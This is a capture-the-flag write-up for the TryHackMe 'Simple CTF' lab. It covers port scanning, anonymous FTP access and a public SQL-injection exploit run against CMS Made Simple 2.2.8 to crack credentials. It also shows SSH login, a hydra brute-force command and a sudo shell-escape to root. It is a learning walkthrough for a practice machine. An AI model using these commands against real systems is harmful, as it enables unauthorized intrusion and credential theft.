---
title: Simple CTF
categories: [Try-Hack-Me] # Up to two elements only
tags: [tryhackme, easy, simple ctf, ctf, sqli, ftp, dirb]     # TAG names should always be lowercase, infinite number of elements
image: /assets/img/posts/Simple_ctf/Simple_ctf.webp    # If you want to add an image to the top of the post contents
# toc: false    # table of content - overwrite global configuration from _config.yml
# comments: false       # overwrite global configuration from _config.yml
# pin: true     # pin one or more posts to the top of the home page
excerpt_separator: <!--exc-->
permalink: /:categories/:year/:month/:day/:title:output_ext
published: true
---

This is a writeup for the Simple CTF challenge on Try-Hack-Me where you'll need to scan, exploit SQLi vulnerability and escalate your privileges to root. Rated as Easy/Beginner level machine.
<!--exc-->


# Introduction
In this post, we'll try to root [Simple-CTF](https://tryhackme.com/room/easyctf). It was created by [MrSeth6797](https://tryhackme.com/p/MrSeth6797). It is rated as **Easy/Beginner** level machine.


# Prerequisites
## Kali Linux / Parrot Security OS 
The virtual machine we'll use to source the attack vectors against the Simple-CTF machine. These Linux distribution has all required tools pre-installed. Choose one of them.
* Kali Linux VM (based on Debian distribution) can be downloaded for both VMware and VirtualBox from [Offensive-Security](https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/)
* Parrot Security VM (based on Arch distribution with different desktop flavors) can be downloaded from [Parrot Security](https://www.parrotsec.org/download/)

## TryHackMe account
Signup or login to [TryHackMe](https://tryhackme.com/), deploy the [machine](https://tryhackme.com/room/easyctf) and give it a couple of minutes to boot.

## Dedicated Directory
We need to create a dedicated directory in our home directory `~` for our findings. We'll use `mkdir` to create the directory and `cd` to change into it:

```console
$ mkdir ~/tryhackme/simple_ctf
$ cd ~/tryhackme/simple_ctf/
```

## Add IP to hosts file [OPTIONAL]
For better readability we'll add the target IP to our local `/etc/hosts` file.
Please note this command requires sudo privileges. 

```console
$ sudo nano /etc/hosts

127.0.0.1       localhost
127.0.1.1       kali
10.10.157.7     simple.ctf
...
```

Now we can use the '**simple.ctf**' hostname instead of the IP in all the commands.


# Scanning
## nmap
We'll start with scanning the target for open ports using [nmap](https://nmap.org/). The command we'll use is `sudo nmap -sV -T4 -p- -O -oN nmap simple.ctf` which is a full TCP-SYN scan to scan all ports on the target. Let's break it down:
* `-sV` determine service/version info
* `-T4` for faster execution
* `-p-` scan all ports
* `-O` identify Operating System
* `-oN` output to file, in our case it's called nmap

```console
$ sudo nmap -sV -p- -T4 -O -oN nmap simple.ctf
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-09 10:41 EST
Nmap scan report for 10.10.157.7
Host is up (0.081s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (92%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Adtran 424RG FTTH gateway (86%), Linux 2.6.32 (86%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 193.13 seconds
```

## FTP
Personally, if a scan finds a listening FTP service, I ALWAYS try to login using *anonymous* user with empty password. Let's do that.

```console
$ ftp simple.ctf
Name (10.10.64.49:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

Nice! we're able to login. In order to list all files in the current directory, we use `ls -la` commandand find an interesting file - `ForMitch.txt`. Using `get ForMitch.txt` command we pull that file to our local machine and read it. It's content:

```
Dammit man... you're the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
```

Looks like we have two potential usernames:
1. Mitch / mitch
2. system / root


## Website
Using Firefox we can check the website on port 80. It looks like a simple Apache default page. Nothing in website headers as well.
We'll run a directory scan using **dirb** to try and find interesting URLs

```console
$ dirb http://simple.ctf  

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Jan  9 15:29:03 2021
URL_BASE: http://simple.ctf/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------
GENERATED WORDS: 4612                                                          
---- Scanning URL: http://simple.ctf/ ----
+ http://simple.ctf/index.html (CODE:200|SIZE:11321)                                               
+ http://simple.ctf/robots.txt (CODE:200|SIZE:929)                                                 
+ http://simple.ctf/server-status (CODE:403|SIZE:299)                                             
==> DIRECTORY: http://simple.ctf/simple/                                                           
---- Entering directory: http://simple.ctf/simple/ ----
==> DIRECTORY: http://simple.ctf/simple/admin/                                                     
==> DIRECTORY: http://simple.ctf/simple/assets/                                                   
==> DIRECTORY: http://simple.ctf/simple/doc/                                                       
+ http://simple.ctf/simple/index.php (CODE:200|SIZE:19833)                                         
...
```

dirb found a Simple CMS on `/simple` path. Let's investigate it using Firefox.
**The CMS footer is:**

> Copyright 2004 - 2021 - CMS Made Simple
> This site is powered by CMS Made Simple version 2.2.8

Quick search in [exploit-db](https://www.exploit-db.com/exploits/46635) reveals the CMS version is **vulnerable to SQLi** (You may also use `searchsploit simple 2.2.8` to find that exploit).
We'll download the Python file and run it with `-h` flag to see what arguments we need to provide the script (same can be done if you know your way with Python code but I assume no prior knowledge).
In case you encounter any errors regarding missing packages, use `pip` to install it. Here's a quick [intro to pip](https://docs.python.org/3/installing/index.html#basic-usage)

```console
$ python 46635.py -h
Usage: xpl.py [options]

Options:
  -h, --help            show this help message and exit
  -u URL, --url=URL     Base target uri (ex. http://10.10.10.100/cms)
  -w WORDLIST, --wordlist=WORDLIST
                        Wordlist for crack admin password
  -c, --crack           Crack password with wordlist
```

OK, so our flags are:
* `--url http://simple.ctf/simple`
* `--crack`
* `--wordlist /usr/share/seclists/Passwords/Common-Credentials/best110.txt` 

Keep in mind Seclists in not pre-installed in Kali and can be downloaded using `sudo apt install seclists`

This means the complete command is:
`python 46635.py --url http://simple.ctf/simple --crack --wordlist /usr/share/seclists/Passwords/Common-Credentials/best110.txt`. 

The script will run on a dictionary of character, trying to find the right one in each place by injecting a special payload. The final output consists of the salt, username, email, hashed password and clear text password:
```console
[+] Salt for password found: [REDACTED]
[+] Username found: [REDACTED]
[+] Email found: [REDACTED]
[+] Password found: [REDACTED]
[+] Password cracked: [REDACTED]
```


# Gaining Access
## SSH
Now that we have `username:password` combination we can use it to login to SSH (remember the FTP note? it stated **the combination is the same**):

```
$ ssh mitch@simple.ctf -p2222
The authenticity of host '[simple.ctf]:2222 ([simple.ctf]:2222)' can't be established.
ECDSA key fingerprint is SHA256:Fce5J4GBLgx1+iaSMBjO+NFKOjZvL5LOVF5/jc0kwt8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[simple.ctf]:2222' (ECDSA) to the list of known hosts.
mitch@simple.ctf's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
```

**Success!** We were able to login and npw have an active shell. If we list files in that directory using `ls -la`,  we can find the **user flag**.

Using `ls /home` we can list users in the system. This will reveal there's another user on the machine.


# Privilege Escalation
Using `sudo -l` command we can test our user permissions to run services and files with sudo privileges 

Note:
: Links to further reading about `sudo -l` can be found at the Summary

```
$ sudo -l          
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/[REDACTED]
```

We can use that service to try and spawn a shell with sudo privileges. We first need to lunch the service as `sudo` and try to exit it back to shell. 
`sudo /usr/bin/[REDACTED]`
Now, once we're in that application we can exit back to shell using `:shell` input, but now the shell is *root* shell.

Note:
: Links to further reading how to spawn a TTY Shell can be found at the Summary

```
$ root@Machine:~# whoami
root
$ root@Machine:~# cd /root/
$ root@Machine:/root# ls 
root.txt
$ root@Machine:/root# cat root.txt 
[REDACTED]
```


# Potential Rabbit Holes
## robots.txt
The website's *robots.txt* file contains the following:

```
...
User-agent: *
Disallow: /

Disallow: /openemr-5_0_1_3 
#
# End of "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $".
#
```

*mike* might be a user in Simple CMS and the */openemr-5_0_1_3* might be a URL path.

## hydra / brute-force
Brute-Force *mike*s password on SSH service using Hydra.
`hydra -l system -P /usr/share/wordlists/rockyou.txt ssh://simple.ctf:2222 -t 4`

## Insufficient Scanning
Nikto wasn't able to find the Simple CMS and sent me to a goos chase all confused.


# Summary
## Reading Materials
* [How to spawn a TTY Shell](https://netsec.ws/?p=337)
* *sudo -l* - I see this technique used in many CTFs, It's simple to run and easy to understand. Make sure you feel comfortable with it. [READ](https://www.explainshell.com/explain?cmd=sudo+-l), [READ2](https://medium.com/better-programming/becoming-root-through-misconfigured-sudo-7b68e731d1f5)